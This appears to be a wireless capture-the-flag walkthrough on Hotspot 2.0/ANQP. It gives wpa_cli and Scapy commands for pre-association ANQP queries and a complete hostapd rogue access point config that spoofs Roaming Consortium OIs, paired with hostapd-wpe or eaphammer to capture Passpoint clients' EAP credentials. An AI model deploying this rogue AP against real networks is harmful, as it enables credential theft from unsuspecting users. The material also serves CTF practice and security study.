# Hotspot 2.0 / ANQP — walkthrough

Two plays. Pre-association ANQP recon is the passive one — often
enough to grab a flag without ever associating. Roaming Consortium
spoof is the active one — a Passpoint-configured client silently
associates to your rogue AP based on OI match, no SSID collision
required.

## Path A — ANQP recon (no association)

```
# 1. Bring up wlan0 as a managed interface (NOT monitor — we need
#    to send a GAS Initial Request via the normal MAC).
iw dev wlan0 set type managed
ip link set wlan0 up

# 2. Scan and find the target BSSID.
iw dev wlan0 scan | grep -B4 "Hotspot 2.0"

# 3. Query the ANQP elements. wpa_supplicant / wpa_cli path.
#    IDs per IEEE 802.11-2020 Table 9-271: 259=Venue Name,
#    261=Network Auth Type, 262=Roaming Consortium, 264=NAI Realm,
#    269=Domain Name.
wpa_cli -i wlan0 anqp_get AA:BB:CC:DD:EE:FF 259,261,262,264,269

# 4. Read the response.
wpa_cli -i wlan0 status
#   RX-ANQP: ...
#   anqp_venue_name=...
#   anqp_nai_realm=...
#   anqp_roaming_consortium=506F9A00300F...
#   anqp_domain_name=...
```

The `anqp_nai_realm` or `anqp_venue_name` string is often the flag.
No association, no crack — just a Public Action frame and its response.

## Path B — Scapy GAS query (portable, no wpa_supplicant)

```python
from scapy.all import *
# GAS Initial Request: Category=4 (Public Action), Action=10 (GAS
# Initial Request), Dialog Token, Advertisement Protocol IE,
# Query Length, ANQP Query List.

ANQP_QUERY = bytes([
    0x04,           # Public Action
    0x0a,           # GAS Initial Request
    0x01,           # Dialog Token
    # Advertisement Protocol IE: id=108 (0x6c), len=2, tuple=(0x7f, 0x00)
    0x6c, 0x02, 0x7f, 0x00,
    # Query Length (little-endian) — payload is 4-byte ANQP Query List
    # header + 5 × 2-byte requested IDs = 14 bytes = 0x0e.
    0x0e, 0x00,
    # ANQP Query List element: id=257 (0x0101 LE) + length (10 bytes
    # for 5 requested IDs).
    0x01, 0x01, 0x0a, 0x00,
    # Requested ANQP element IDs (LE, 2 bytes each). Per 802.11-2020
    # Table 9-271.
    0x03, 0x01,      # 259 Venue Name
    0x05, 0x01,      # 261 Network Auth Type
    0x06, 0x01,      # 262 Roaming Consortium
    0x08, 0x01,      # 264 NAI Realm
    0x0d, 0x01,      # 269 Domain Name
])

frame = RadioTap() / Dot11(
    type=0, subtype=13,          # mgmt, action
    addr1="AA:BB:CC:DD:EE:FF",   # target BSSID
    addr2=YOUR_MAC,
    addr3="AA:BB:CC:DD:EE:FF",
) / Raw(load=ANQP_QUERY)

sendp(frame, iface="wlan1mon")
# Capture the response with airodump-ng running in the background.
```

Filter for the response in Wireshark: `wlan.fc.type_subtype == 0x0d
and wlan.fixed.category_code == 4 and wlan.fixed.publicact == 0x0b`.

## Path C — Roaming Consortium OI spoof

Passpoint clients are provisioned with a Home OI list (e.g. via an
`.eap-config` profile from their carrier). Any AP advertising a
matching OI in its beacon Interworking + Roaming Consortium IEs is a
"home" network to that client, and its supplicant will auto-associate
regardless of SSID.

```
# hostapd rogue with OI 50:6F:9A (Wi-Fi Alliance sample OI)
interface=wlan1
ssid=P1N3NUT5-Passpoint
hw_mode=g
channel=6
wpa=2
wpa_key_mgmt=WPA-EAP
ieee8021x=1
auth_server_addr=127.0.0.1
auth_server_port=1812
auth_server_shared_secret=whatever
interworking=1
access_network_type=2         # chargeable public network
venue_group=2                 # business
venue_type=8                  # bank / financial institution
hessid=00:00:00:00:00:00
roaming_consortium=506F9A
roaming_consortium=001BC504BD
```

Point the EAP server at a hostapd-wpe or eaphammer instance to capture
whatever inner-EAP the Passpoint client offers.

## When ANQP carries the flag itself

- **Venue Name (259)** — WCTF puzzle: "the venue name is the flag."
- **NAI Realm (264)** — "the realm string is the flag."
- **Domain Name (269)** — "the domain string is the flag."
- **Roaming Consortium (262)** — "the OI is the flag."

All four are queryable pre-association. Path A finishes the puzzle in
one command.

## Failure modes

- **AP does not advertise Interworking bit.** ANQP queries return
  nothing. Not a Hotspot 2.0 AP. Move on.
- **AP responds but with empty ANQP elements.** Vendor-side privacy —
  some enterprise gear suppresses ANQP responses to STAs it doesn't
  recognize. Try after associating.
- **Client refuses OI-matched rogue.** Modern Passpoint profiles pin
  server certificates. Weak-cert-validation clients are a separate
  attack (see `cert-phish-eaphammer-weak-validation`).

## Cite

- IEEE Std 802.11-2020 §9.4.5 (ANQP), §11.25 (GAS), §11.22
  (Interworking).
- Wi-Fi Alliance — Passpoint / Hotspot 2.0 Release 3 spec.
- attacks.json: `anqp-realm-enum`,
  `passpoint-roaming-consortium-spoof`,
  `cert-phish-eaphammer-weak-validation`.
